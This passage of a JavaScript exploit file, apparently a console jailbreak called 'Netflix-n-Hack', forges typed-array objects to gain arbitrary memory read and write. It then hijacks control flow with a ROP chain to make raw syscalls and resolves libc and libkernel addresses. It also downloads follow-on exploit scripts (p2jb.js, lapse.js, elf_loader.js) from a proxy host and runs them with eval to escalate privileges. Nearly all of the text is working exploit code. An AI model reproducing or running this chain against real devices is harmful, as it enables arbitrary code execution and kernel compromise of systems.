        write32_unstable(fake_u8_arr_buffer + 0x0cn, 0x1000n);      // byte_length lower 32b
        write32_unstable(fake_u8_arr_buffer + 0x14n, fake_u8_arr_elements + 8n +1n);  // backing_store lower 32b
        write32_unstable(fake_u8_arr_buffer + 0x18n, top32b_heap);                    // backing_store upper 32b
        write32_unstable(fake_u8_arr_buffer + 0x24n, uint8_buffer_bitfield);  // bit_field

        write32_unstable(fake_u8_arr_elements + 0x00n, uint8_elem_map);
        write32_unstable(fake_u8_arr_elements + 0x04n, uint8_elem_len);  // Fake size in bytes

        write32_unstable(fake_u8_arr_obj + 0x00n, uint8_map);
        write32_unstable(fake_u8_arr_obj + 0x04n, uint8_props);
        write32_unstable(fake_u8_arr_obj + 0x08n, fake_u8_arr_elements + 1n);
        write32_unstable(fake_u8_arr_obj + 0x0Cn, fake_u8_arr_buffer + 1n);
        write64_unstable(fake_u8_arr_obj + 0x18n, 0x1000n);     // Fake size in bytes
        write64_unstable(fake_u8_arr_obj + 0x20n, 0x1000n);     // Fake size in elements
        write32_unstable(fake_u8_arr_obj + 0x28n, fake_u8_arr_buffer + 16n*4n);  // external_pointer lower 32b
        write32_unstable(fake_u8_arr_obj + 0x2Cn, top32b_heap);  // external_pointer upper 32b
        write32_unstable(fake_u8_arr_obj + 0x30n, 0n);  // base_pointer lower 32b
        write32_unstable(fake_u8_arr_obj + 0x34n, 0n);  // base_pointer upper 32b
        /*******************************************************************************************************/
        /********** End Fake Victim Uint8Array                            **********/
        /*******************************************************************************************************/

        /*******************************************************************************************************/
        /**********                             Init Fake ROP BigUInt64Array                          **********/
        /*******************************************************************************************************/
        write32_unstable(fake_rop_arr_buffer + 0x00n, biguint_buffer_map);
        write32_unstable(fake_rop_arr_buffer + 0x04n, biguint_buffer_props);
        write32_unstable(fake_rop_arr_buffer + 0x08n, biguint_buffer_elem);
        write32_unstable(fake_rop_arr_buffer + 0x0cn, 0x500n*8n);      // byte_length lower 32b
        write32_unstable(fake_rop_arr_buffer + 0x14n, fake_rop_arr_elements + 8n +1n);  // backing_store lower 32b
        write32_unstable(fake_rop_arr_buffer + 0x18n, top32b_heap);                    // backing_store upper 32b
        write32_unstable(fake_rop_arr_buffer + 0x24n, biguint_buffer_bitfield);  // bit_field

        write32_unstable(fake_rop_arr_elements + 0x00n, biguint_elem_map);
        write32_unstable(fake_rop_arr_elements + 0x04n, biguint_elem_len);  // Fake size in bytes

        write32_unstable(fake_rop_arr_obj + 0x00n, biguint_map);
        write32_unstable(fake_rop_arr_obj + 0x04n, biguint_props);
        write32_unstable(fake_rop_arr_obj + 0x08n, fake_rop_arr_elements + 1n);
        write32_unstable(fake_rop_arr_obj + 0x0Cn, fake_rop_arr_buffer + 1n);
        write64_unstable(fake_rop_arr_obj + 0x18n, 0x2800n);      // Fake size in bytes
        write64_unstable(fake_rop_arr_obj + 0x20n, 0x0500n);      // Fake size in elements
        write32_unstable(fake_rop_arr_obj + 0x28n, fake_rop_arr_buffer + 16n*4n);  // external_pointer lower 32b
        write32_unstable(fake_rop_arr_obj + 0x2Cn, top32b_heap);  // external_pointer upper 32b
        write32_unstable(fake_rop_arr_obj + 0x30n, 0n);  // base_pointer lower 32b
        write32_unstable(fake_rop_arr_obj + 0x34n, 0n);  // base_pointer upper 32b
        /*******************************************************************************************************/
        /**********                             End Fake Victim BigUInt64Array                        **********/
        /*******************************************************************************************************/

        // Materialize fake objects
        const fake_rw = create_fakeobj_unstable(fake_rw_obj);
        let fake_rw_add = addrof_unstable(fake_rw);
        //logger.log("This is the add of fake_rw materialized : " + hex(fake_rw_add));

        const fake_victim = create_fakeobj_unstable(fake_bui64_arr_obj);
        let fake_victim_add = addrof_unstable(fake_victim);
        //logger.log("This is the add of fake_victim materialized : " + hex(fake_victim_add));

        const fake_obj_arr = create_fakeobj_unstable(fake_obj_arr_obj);
        let fake_obj_arr_add = addrof_unstable(fake_obj_arr);
        //logger.log("This is the add of fake_obj_arr materialized : " + hex(fake_obj_arr_add));

        const fake_victim_8 = create_fakeobj_unstable(fake_u8_arr_obj);
        // logger.log("This is the add of fake_victim_8 materialized : " + hex(fake_victim_8));

        const fake_rop = create_fakeobj_unstable(fake_rop_arr_obj);
        let fake_rop_add = addrof_unstable(fake_rop);
        //logger.log("This is the add of fake_rop materialized : " + hex(fake_rop_add));

        // Now we have OOB, Victim and Obj to make stable primitives

        function addrof (obj) {
          fake_obj_arr[0] = obj;
          return (fake_rw[59] & 0xffffffffn) - 1n;
        }


        /***** The following primitives r/w a compressed Add *****/
        /***** The top 32 bits are completed with top32b_heap *****/

        function read64 (add) {
          let add_32 = add & 0xffffffffn; // Just in case
          let original_value = fake_rw[21];
          fake_rw[21] = (top32b_heap<<32n) + add_32; // external_ptr of buffer
          let read_value = fake_victim[0];
          fake_rw[21] = original_value;
          return read_value;
        }

        function write64 (add, value) {
          let add_32 = add & 0xffffffffn; // Just in case
          let original_value = fake_rw[21];
          fake_rw[21] = (top32b_heap<<32n) + add_32; // external_ptr of buffer
          fake_victim[0] = value;
          fake_rw[21] = original_value;
        }

        function read32(add){
          let read = read64(add);
          return  read & 0xffffffffn;
        }

        function write32(add, value) {
          let read = read64(add);
          let new_value = (read & ~0xffffffffn) | (BigInt(value) & 0xffffffffn);
          write64(add, new_value);
        }

        function read16(add){
          let read1 = read64(add);
          return  read1 & 0xffffn;
        }

        function write16(add, value) {
          let read = read64(add);
          let new_value = (read & ~0xffffn) | (BigInt(value) & 0xffffn);
          write64(add, new_value);
        }

        function read8(add){
          let read = read64(add);
          return  read & 0xffn;
        }

        function write8(add, value) {
          let read = read64(add);
          let new_value = (read & ~0xffn) | (BigInt(value) & 0xffn);
          write64(add, new_value);
        }

        /***** The following primitives r/w a full 64bits Add *****/

        function read64_uncompressed (add) {
          let original_value = fake_rw[21];
          fake_rw[21] = add; // external_ptr of buffer
          let read_value = fake_victim[0];
          fake_rw[21] = original_value;
          return read_value;
        }

        function write64_uncompressed (add, value) {
          let original_value = fake_rw[21];
          fake_rw[21] = add; // external_ptr of buffer
          fake_victim[0] = value;
          fake_rw[21] = original_value;
        }

        function read32_uncompressed(add){
            let orig = fake_rw[85];
            fake_rw[85] = add;
            let v = fake_victim_8[0] | (fake_victim_8[1] << 8) |
                    (fake_victim_8[2] << 16) | ((fake_victim_8[3] << 24) >>> 0);
            fake_rw[85] = orig;
            return BigInt(v >>> 0);
        }

        function write32_uncompressed(add, value) {
            let orig = fake_rw[85];
            let v = Number(value);
            fake_rw[85] = add;
            fake_victim_8[0] = v & 0xFF;
            fake_victim_8[1] = (v >> 8) & 0xFF;
            fake_victim_8[2] = (v >> 16) & 0xFF;
            fake_victim_8[3] = (v >> 24) & 0xFF;
            fake_rw[85] = orig;
        }

        function read16_uncompressed(add){
            let orig = fake_rw[85];
            fake_rw[85] = add;
            let v = fake_victim_8[0] | (fake_victim_8[1] << 8);
            fake_rw[85] = orig;
            return BigInt(v);
        }

        function write16_uncompressed(add, value) {
            let orig = fake_rw[85];
            let v = Number(value);
            fake_rw[85] = add;
            fake_victim_8[0] = v & 0xFF;
            fake_victim_8[1] = (v >> 8) & 0xFF;
            fake_rw[85] = orig;
        }

        function read8_uncompressed(add) {
            let original_value = fake_rw[85];
            fake_rw[85] = add; // Update fake_victim_8's external_ptr
            let read_value = fake_victim_8[0];
            fake_rw[85] = original_value;
            return BigInt(read_value);
        }

        function write8_uncompressed(add, value) {
            let original_value = fake_rw[85];
            fake_rw[85] = add; // Update fake_victim_8's external_ptr
            fake_victim_8[0] = Number(BigInt(value) & 0xffn); // Pure 1-byte STRB write
            fake_rw[85] = original_value;
        }

        function copy_uncompressed (add_src, add_dst, len, verbose=false) {
            let orig_8 = fake_rw[85];

            const CHUNK = 4096;
            const total = Number(BigInt(len));

            const numChunks = Math.ceil(total / CHUNK);
            const srcAddrs = new Array(numChunks);
            const dstAddrs = new Array(numChunks);
            const chunkSizes = new Array(numChunks);
            for (let c = 0; c < numChunks; c++) {
                const off = BigInt(c * CHUNK);
                srcAddrs[c] = add_src + off;
                dstAddrs[c] = add_dst + off;
                chunkSizes[c] = Math.min(CHUNK, total - c * CHUNK);
            }

            const tmp = new Uint8Array(CHUNK);

            if (verbose) logger.log("xcpy_uc total=" + total + " chunks=" + numChunks);

            for (let c = 0; c < numChunks; c++) {
                if (verbose && !(c & 3)) {
                    logger.log("xcpy_uc chunk " + c + "/" + numChunks);
                }

                const n = chunkSizes[c];

                fake_rw[85] = srcAddrs[c];
                for (let j = 0; j < n; j++) tmp[j] = fake_victim_8[j];

                fake_rw[85] = dstAddrs[c];
                for (let j = 0; j < n; j++) fake_victim_8[j] = tmp[j];
            }

            fake_rw[85] = orig_8;
            if (verbose) logger.log("xcpy_uc done");
        }

        function get_backing_store(typed_array) {
          const obj_addr = addrof(typed_array);
          const external = read64(obj_addr + 0x28n);
          const base = read64(obj_addr + 0x30n);
          return base + external;
        }

        let allocated_buffers = [];

        function malloc (size) {
            const buffer = new ArrayBuffer(size);
            const buffer_addr = addrof(buffer);
            const backing_store = read64(buffer_addr + 0x14n);
            allocated_buffers.push(buffer);
            return backing_store;
        }

        logger.log("Stable Primitives Achieved.");
        logger.flush();

        const rop_address = get_backing_store(fake_rop);
        logger.log("Address of ROP obj: " + hex(addrof(fake_rop)) );
        logger.log("Address of ROP: " + hex(rop_address) );
        logger.flush();

        function rop_smash (x) {
          let a = 100;
          return 0x1234567812345678n;
        }

        let value_delete = rop_smash(1); // Generate Bytecode

        add_rop_smash = addrof(rop_smash);
        //logger.log("This is the add of function 'rop_smash': " + hex(add_rop_smash) );
        add_rop_smash_sharedfunctioninfo = read32(add_rop_smash + 0x0Cn) -1n;
        add_rop_smash_code = read32(add_rop_smash_sharedfunctioninfo + 0x04n) -1n;
        add_rop_smash_code_store = add_rop_smash_code + 0x22n;

        //logger.log("Address of fake_frame: 0x" + hex(base_heap_add + fake_frame) );
        //logger.log("Address of fake_bytecode: " + hex(base_heap_add + fake_bytecode) );
        //logger.log("Address of fake_rop_return: " + hex(base_heap_add + fake_rop_return) );

        write8(fake_bytecode + 0x00n, 0xABn);
        write8(fake_bytecode + 0x17n, 0x00n); // Here is the value of RBX , force 0

        /*
        Address	    Instruction
        734217FB	jmp 0x73421789
        734217FD	mov rbx, qword ptr [rbp - 0x20] --> Fake Bytecode buffer on rbx
        73421801	mov ebx, dword ptr [rbx + 0x17] --> Fake Bytecode buffer + 0x17 (part of fake_bytecode[2])
        73421804	mov rcx, qword ptr [rbp - 0x18] --> Value forced to 0xff00000000000000
        73421808	lea rcx, [rcx*8 + 8]
        73421810	cmp rbx, rcx
        73421813	jge 0x73421818                  --> Because of forced value, it jumps right to the leave
        73421815	mov rbx, rcx
        73421818	leave
        73421819	pop rcx
        7342181A	add rsp, rbx                    --> RBX should be 0 here
        7342181D	push rcx
        7342181E	ret
        */

        write64(fake_frame  - 0x20n, base_heap_add + fake_bytecode);  // Put the return code (by pointer) in R14
                                                                      // this is gonna be offseted by R9
        write64(fake_frame  - 0x28n, 0x00n);                          // Force the value of R9 = 0
        write64(fake_frame  - 0x18n, 0xff00000000000000n);            // Fake value for (Builtins_InterpreterEntryTrampoline+286) to skip break * Builtins_InterpreterEntryTrampoline+303

        write64(fake_frame + 0x08n, g.get('pop_rsp')); // pop rsp ; ret --> this change the stack pointer to your stack
        write64(fake_frame + 0x10n, rop_address);

        // Pre-computed constants and cache state for call_rop.
        const _cr_stack_offset    = 0x700000001n;
        const _cr_rop_return_addr = base_heap_add + fake_rop_return;
        const _cr_fake_frame_lo   = fake_frame & 0xffffffffn;
        let _cr_cached_rbp    = null;
        let _cr_rop_primed    = false;
        let _cr_execute_primed = false;
        let _cr_caching_active = false;
        function _cr_reset_cache() { _cr_cached_rbp = null; _cr_rop_primed = false; _cr_execute_primed = false; }
        function _cr_enable_caching()  { _cr_reset_cache(); _cr_caching_active = true; }
        function _cr_disable_caching() { _cr_reset_cache(); _cr_caching_active = false; }

        // This function is calling a given function address and takes all arguments
        // Returns the value returned by the called function
        function call_rop (address, rax = 0x0n, arg1 = 0x0n, arg2 = 0x0n, arg3 = 0x0n, arg4 = 0x0n, arg5 = 0x0n, arg6 = 0x0n) {

            if (_cr_caching_active) {
                if (_cr_cached_rbp === null) {
                    write64(add_rop_smash_code_store, 0xab0025n);
                    _cr_cached_rbp = addrof(rop_smash(1)) + _cr_stack_offset;
                    _cr_execute_primed = false;
                }
                real_rbp = _cr_cached_rbp;
            } else {
                write64(add_rop_smash_code_store, 0xab0025n);
                real_rbp = addrof(rop_smash(1)) + _cr_stack_offset;
                _cr_execute_primed = false;
            }

            let i = 0;

            // Syscall Number (Syscall Wrapper)
            fake_rop[i++] = g.get('pop_rax');
            fake_rop[i++] = rax;

            // Arguments
            fake_rop[i++] = g.get('pop_rdi');
            fake_rop[i++] = arg1;
            fake_rop[i++] = g.get('pop_rsi');
            fake_rop[i++] = arg2;
            fake_rop[i++] = g.get('pop_rdx');
            fake_rop[i++] = arg3;
            fake_rop[i++] = g.get('pop_rcx');
            fake_rop[i++] = arg4;
            fake_rop[i++] = g.get('pop_r8');
            fake_rop[i++] = arg5;
            fake_rop[i++] = g.get('pop_r9');
            fake_rop[i++] = arg6;

            // Call Syscall Wrapper / Function
            fake_rop[i++] = address;

            // Store return value to fake_rop_return
            fake_rop[i++] = g.get('pop_rdi');
            fake_rop[i++] = _cr_rop_return_addr;
            fake_rop[i++] = g.get('mov_qword_ptr_rdi_rax');

            // Return to JS
            fake_rop[i++] = g.get('pop_rax');
            fake_rop[i++] = 0x2000n;
            fake_rop[i++] = g.get('pop_rsp_pop_rbp');
            fake_rop[i++] = real_rbp;

            if (!_cr_execute_primed) {
                write64(add_rop_smash_code_store, 0xab00260325n);
                _cr_execute_primed = true;
            }
            // fake_rw[59] is clobbered by addrof() every time it runs (addrof sets
            // fake_obj_arr[0] which overwrites the same heap slot). Must restore it
            // after any addrof call. Non-caching: addrof runs every call → always
            // restore. Caching: addrof only runs on the first call (_cr_cached_rbp
            // null); after that it is skipped, so fake_rw[59] stays correct and the
            // write can be skipped.
            if (!_cr_caching_active || !_cr_rop_primed) {
                fake_rw[59] = _cr_fake_frame_lo;
                _cr_rop_primed = true;
            }
            rop_smash(fake_obj_arr[0]);
        }

        function call (address, arg1 = 0x0n, arg2 = 0x0n, arg3 = 0x0n, arg4 = 0x0n, arg5 = 0x0n, arg6 = 0x0n) {
            call_rop(address, 0x0n, arg1, arg2, arg3, arg4, arg5, arg6);
            return read64(fake_rop_return);
        }

        /***** LibC *****/
        const libc_base = read64_uncompressed(eboot_base + 0x241F2B0n) - 0x1C0n;
        logger.log("libc base : " + hex(libc_base));
        const gettimeofdayAddr = read64_uncompressed(libc_base + 0x10f998n);
        logger.log("gettimeofdayAddr : " + hex(gettimeofdayAddr));
        const syscall_wrapper = gettimeofdayAddr + 0x7n;
        logger.log("syscall_wrapper : " + hex(syscall_wrapper));
        const sceKernelGetModuleInfoFromAddr = read64_uncompressed(libc_base + 0x10fa88n);

        // Thread for elfldr; calling Thrd_create crashes on FW 10.x and possibly higher versions
        let Thrd_create = libc_base + 0x4c30n;
        let Thrd_join = libc_base + 0x4a30n;

        // Used for gpu rw
        const sceKernelAllocateMainDirectMemory = read64_uncompressed(eboot_base + 0x241f6a8n);
        const sceKernelMapDirectMemory = read64_uncompressed(eboot_base + 0x241f680n);

        const libkernel__error = read64_uncompressed(eboot_base + 0x241f3c8n);
        const libc_strerror = read64_uncompressed(eboot_base + 0x241f3d0n);

        function read_cstring (add) {
            let str = '';
            let byte;

            while (true) {
                try {
                    byte = read8_uncompressed(add);
                } catch (e) {
                    logger.log("read_cstring error reading memory at address " + hex(add) + ", e.message");
                    break;
                }
                if (byte === 0n) {
                    break;
                }
                str += String.fromCharCode(Number(byte));
                add++;
            }
            return str;
        }

        /* Useful for getting a description after a syscall failure */
        function get_error_string () {
            let errno_func = call(libkernel__error);
            let errno = read64_uncompressed(errno_func);
            let strerror_add = call(libc_strerror, errno);
            let return_str = errno + " " + read_cstring(strerror_add);
            return return_str;
        }

        const setjmp_addr = read64_uncompressed(eboot_base + 0x241f5f0n);
        const longjmp_addr = read64_uncompressed(eboot_base + 0x241f5f8n);

        const mod_info = malloc(0x300);
        const SEGMENTS_OFFSET = 0x160n;

        ret = call(sceKernelGetModuleInfoFromAddr, gettimeofdayAddr, 0x1n, mod_info);
        logger.log("sceKernelGetModuleInfoFromAddr returned: " + hex(ret));

        if (ret !== 0x0n) {
            logger.log("ERROR: sceKernelGetModuleInfoFromAddr failed: " + hex(ret));
            throw new Error("sceKernelGetModuleInfoFromAddr failed");
        }

        /***** LibKernel *****/
        libkernel_base = read64_uncompressed(mod_info + SEGMENTS_OFFSET);
        logger.log("libkernel_base @ " + hex(libkernel_base));
        logger.flush();

        function syscall(syscall_num, arg1 = 0x0n, arg2 = 0x0n, arg3 = 0x0n, arg4 = 0x0n, arg5 = 0x0n, arg6 = 0x0n)
        {
            call_rop(syscall_wrapper, syscall_num, arg1, arg2, arg3, arg4, arg5, arg6);
            return read64(fake_rop_return);
        }

        function write_string(addr, str) {
            let bytes = stringToBytes(str);
            for (let i = 0; i < str.length; i++) {
                write8_uncompressed(addr + BigInt(i), bytes[i]);
            }

            write8_uncompressed(addr + BigInt(str.length), 0);
        }

        function alloc_string(str) {
            const addr = malloc(str.length + 1); // Full 64bits Add
            let bytes = stringToBytes(str);
            for (let i = 0; i < str.length; i++) {
                write8_uncompressed(addr + BigInt(i), bytes[i]);
            }

            write8_uncompressed(addr + BigInt(str.length), 0);

            return addr;
        }

        function send_notification(text) {
            const notify_buffer_size = 0xc30n;
            const notify_buffer = malloc(Number(notify_buffer_size));
            const icon_uri = "cxml://psnotification/tex_icon_system";

            // Setup notification structure
            write32_uncompressed(notify_buffer + 0x0n, 0);           // type
            write32_uncompressed(notify_buffer + 0x28n, 0);          // unk3
            write32_uncompressed(notify_buffer + 0x2cn, 1);          // use_icon_image_uri
            write32_uncompressed(notify_buffer + 0x10n, 0xffffffff); // target_id (-1 as unsigned)

            // Write message at offset 0x2D
            write_string(notify_buffer + 0x2dn, text);

            // Write icon URI at offset 0x42D
            write_string(notify_buffer + 0x42dn, icon_uri);

            // Open /dev/notification0
            const dev_path = alloc_string("/dev/notification0");
            const fd = syscall(SYSCALL.open, dev_path, O_WRONLY);

            if (Number(fd) < 0) {
                return;
            }

            syscall(SYSCALL.write, fd, notify_buffer, notify_buffer_size);
            syscall(SYSCALL.close, fd);
        }

        send_notification("ð\x9F¥³ð\x9F¥³ Netflix-n-Hack ð\x9F¥³ð\x9F¥³");

        if(ip_script === ""){send_notification("ERROR: NO IP ADDRESS CONFIGURED");}
        /******************************************************************************/
        /**********             Usefull functions for automation             **********/
        /******************************************************************************/

        function parseIP(ip_str) {
            const parts = ip_str.split(".");
            return ( (parseInt(parts[0]) | (parseInt(parts[1]) << 8) | (parseInt(parts[2]) << 16) | (parseInt(parts[3]) << 24)) >>> 0);
        }

        function connectToServer(port) {
            const sock = syscall(SYSCALL.socket, 2n, 1n, 0n);

            if (Number(sock) < 0)
                logger.log(`Socket creation failed: ${Number(sock)}`);

            const sockaddr = malloc(16);

            write8_uncompressed(sockaddr + 1n, 2n);

            const port_be = ((port & 0xff) << 8) | ((port >> 8) & 0xff);

            write16_uncompressed(sockaddr + 2n, BigInt(port_be));
            write32_uncompressed(sockaddr + 4n, BigInt(parseIP(ip_script)));

            const ret = syscall(SYSCALL.connect, sock, sockaddr, 16n);

            if(ret == 0xffffffffffffffffn) {
                syscall(SYSCALL.close, sock);
                logger.log(`Connect failed: ${Number(ret)}` + " error: " + get_error_string());
            }
            return sock;
        }

        let _nanosleep_ts = 0n;
        function nanosleep_ms(ms) {
            if (!_nanosleep_ts) _nanosleep_ts = malloc(16);
            write64_uncompressed(_nanosleep_ts,      BigInt(Math.floor(ms / 1000)));
            write64_uncompressed(_nanosleep_ts + 8n, BigInt((ms % 1000) * 1000000));
            syscall(SYSCALL.nanosleep, _nanosleep_ts, 0n);
        }

        function httpGet(sock, path) {
            const request = `GET ${path} HTTP/1.1\r\nHost: ${ip_script}\r\nConnection: close\r\n\r\n`;
            ret = syscall(SYSCALL.write, sock, alloc_string(request), BigInt(request.length));
            if(ret == 0xffffffffffffffffn) {
                logger.log(get_error_string() + " error: " + get_error_string());;
            }
        }

        // It fakes an HTML request to the MITM proxy
        // The proxy intercepts it and respons with the file
        // That needs to be defined in the proxy.py script
        // Arguments: filename, buffer to store data, buffer capacity
        function fetch_file (filename, buffer_return, buffer_size) {
            let sock;
            let fd = -1n;
            let total_received = 0;
            try {
                sock = connectToServer(ip_script_port);       // Connect to the MITM proxy to fake a request
                httpGet(sock, `/js/${filename}`);

                let header_bytes = 0;
                let carry = 0;

                while (true) {
                    const bytes_read = Number(syscall(SYSCALL.read, sock,
                        prefetch_scratch + BigInt(carry), BigInt(256 - carry)));
                    if (bytes_read <= 0)
                        throw new Error("Connection closed before HTTP header was found.");
                    const bytes_available = carry + bytes_read;

                    let orig_8 = fake_rw[85];
                    fake_rw[85] = prefetch_scratch;
                    let header_end_idx = -1;
                    const scan_limit = bytes_available - 3;
                    for (let j = 0; j < scan_limit; j++) {
                        if (fake_victim_8[j]     === 0x0D &&
                            fake_victim_8[j + 1] === 0x0A &&
                            fake_victim_8[j + 2] === 0x0D &&
                            fake_victim_8[j + 3] === 0x0A) {
                            header_end_idx = j;
                            break;
                        }
                    }
                    fake_rw[85] = orig_8;

                    if (header_end_idx >= 0) {
                        const body_start = header_end_idx + 4;
                        const prefix_len = bytes_available - body_start;
                        if (prefix_len > 0) {
                            copy_uncompressed(prefetch_scratch + BigInt(body_start),
                                buffer_return, prefix_len);
                        }
                        total_received = prefix_len;
                        break;
                    }

                    header_bytes += bytes_available;
                    if (header_bytes > 16384)
                        throw new Error("Could not find HTTP header; response too large");

                    if (bytes_available >= 3) {
                        orig_8 = fake_rw[85];
                        fake_rw[85] = prefetch_scratch;
                        const s = bytes_available - 3;
                        const b0 = fake_victim_8[s];
                        const b1 = fake_victim_8[s + 1];
                        const b2 = fake_victim_8[s + 2];
                        fake_victim_8[0] = b0;
                        fake_victim_8[1] = b1;
                        fake_victim_8[2] = b2;
                        fake_rw[85] = orig_8;
                        carry = 3;
                    } else {
                        carry = bytes_available;
                    }
                }

                // Loop over the rest of the data
                while (total_received < buffer_size) {
                    const bytes_remaining = BigInt(buffer_size - total_received);
                    const chunk = bytes_remaining < 65536n ? bytes_remaining : 65536n;
                    const n = syscall(SYSCALL.read, sock, buffer_return + BigInt(total_received), chunk);
                    if (n === 0xffffffffffffffffn || n === 0n) break;
                    total_received += Number(n);
                }
                if (total_received >= buffer_size) {
                    const probe = syscall(SYSCALL.read, sock, prefetch_scratch, 1n);
                    if (probe !== 0xffffffffffffffffn && probe !== 0n)
                        throw new Error("fetch_file: response (" + total_received + "+) exceeds buffer size " + buffer_size);
                }
            } catch (e) {
                logger.log(`- File download failed: ${e}`);
                logger.flush();
                return false;
            } finally {
                if (sock) syscall(SYSCALL.close, sock);
                if (fd >= 0) syscall(SYSCALL.close, fd);
                //logger.log("Total received: " + total_received);
                return total_received;
            }
        }

        function bytes_to_string (add, size) {
            let str = '';
            let byte;

            let offset = 0;

            while (true) {
                try {
                    byte = read8_uncompressed(add + BigInt(offset));
                } catch (e) {
                    logger.log("read_cstring error reading memory at address " + hex(add) + ", e.message");
                    break;
                }
                str += String.fromCharCode(Number(byte));
                offset++;
                if (offset == size) break;
            }
            return str;
        }


        function toHex(num) {
            return '0x' + BigInt(num).toString(16).padStart(16, '0');
        }

        // Arguments: script_name configured in MITM proxy
        // Returned value: JS String (null if error)
        function get_script(script_name) {
            let bytes_received = fetch_file(script_name, script_scratch, 512*1024);
            let script_str = bytes_to_string(script_scratch, bytes_received);
            return script_str;
        }

        function is_jailbroken() {
            const cur_uid = syscall(SYSCALL.getuid);
            const is_in_sandbox = syscall(SYSCALL.is_in_sandbox);
            if (cur_uid === 0n && is_in_sandbox === 0n) {
                return true;
            } else {

                // Check if elfldr is running at 9021
                const sockaddr_in = malloc(16);
                const enable = malloc(4);

                const sock_fd = syscall(SYSCALL.socket, AF_INET, SOCK_STREAM, 0n);
                if (sock_fd === 0xffffffffffffffffn) {
                    throw new Error("socket failed: " + hex(sock_fd));
                }

                try {
                    write32_uncompressed(enable, 1);
                    syscall(SYSCALL.setsockopt, sock_fd, SOL_SOCKET, SO_REUSEADDR, enable, 4n);

                    write8_uncompressed(sockaddr_in + 1n, AF_INET);
                    write16_uncompressed(sockaddr_in + 2n, 0x3D23n);      // port 9021
                    write32_uncompressed(sockaddr_in + 4n, 0x0100007Fn);  // 127.0.0.1

                    // Try to connect to 127.0.0.1:9021
                    const ret = syscall(SYSCALL.connect, sock_fd, sockaddr_in, 16n);

                    if (ret === 0n) {
                        syscall(SYSCALL.close, sock_fd);
                        return true;
                    } else {
                        syscall(SYSCALL.close, sock_fd);
                        return false;
                    }
                } catch (e) {
                    syscall(SYSCALL.close, sock_fd);
                    return false;
                }
            }
        }

        function sysctlbyname(name, oldp, oldp_len, newp, newp_len) {
            const translate_name_mib = malloc(0x8);
            const buf_size = 0x70;
            const mib = malloc(buf_size);
            const size = malloc(0x8);

            write64_uncompressed(translate_name_mib, 0x300000000n);
            write64_uncompressed(size, BigInt(buf_size));

            const name_addr = alloc_string(name);
            const name_len = BigInt(name.length);

            if (syscall(SYSCALL.sysctl, translate_name_mib, 2n, mib, size, name_addr, name_len) === 0xffffffffffffffffn) {
                throw new Error("failed to translate sysctl name to mib (" + name + ")");
            }

            if (syscall(SYSCALL.sysctl, mib, 2n, oldp, oldp_len, newp, newp_len) === 0xffffffffffffffffn) {
                return false;
            }

            return true;
        }

        function get_fwversion() {
            const buf = malloc(0x8);
            const size = malloc(0x8);
            write64_uncompressed(size, 0x8n);

            if (sysctlbyname("kern.sdk_version", buf, size, 0n, 0n)) {
                const byte1 = Number(read8_uncompressed(buf + 2n));  // Minor version (first byte)
                const byte2 = Number(read8_uncompressed(buf + 3n));  // Major version (second byte)

                const version = byte2.toString(16) + '.' + byte1.toString(16).padStart(2, '0');
                return version;
            }

            return null;
        }

        function compare_version(a, b) {
            const [amaj, amin] = a.split('.').map(Number);
            const [bmaj, bmin] = b.split('.').map(Number);
            return amaj === bmaj ? amin - bmin : amaj - bmaj;
        }

        /***** Let's trigger Jailbreak *****/

        FW_VERSION = get_fwversion();

        prefetch_scratch = malloc(256);
        script_scratch = malloc(512*1024);

        var kernel = { addr: {}, read_buffer: null, write_buffer: null };
        var kernel_offset = null;

        if (compare_version(FW_VERSION, "12.40") > 0) {
            logger.log("Unsupported FW_VERSION: " + FW_VERSION);
            send_notification("Unsupported FW_VERSION: " + FW_VERSION);
        } else if (compare_version(FW_VERSION, "10.01") > 0) {
            logger.disableWidget();

            var script_name = "p2jb.js";
            logger.log("loading " + script_name);
            let script = get_script(script_name);

            if (script.trim().startsWith("<")) {
                let errorMsg = "get_script returned HTML instead of JS (likely a 404 error). First 50 chars: " + script.substring(0, 50);
                logger.log(errorMsg);
                logger.flush();
                return;
            }
            eval(script);
            logger.flush();
        } else {
            // Trigger Lapse
            script = get_script("lapse.js");
            eval(script);
            logger.flush();
            send_notification("elf_loader.js");
            script = get_script("elf_loader.js");
            eval(script);
            logger.flush();
        }

        if (!is_jailbroken()) {
            send_notification("Jailbreak didn't succeed. Reboot and Try again!");
            throw new Error("Jailbreak didn't succeed");
        }


    } catch (e) {
        logger.log("EXCEPTION: " + e.message);
        logger.log(e.stack);
        logger.flush();
    }
}

// ws.init(ip_script, 1337, () => { logger.log("Websocket initiated successfully"); main();});// uncomment this to enable WebSocket logging
main();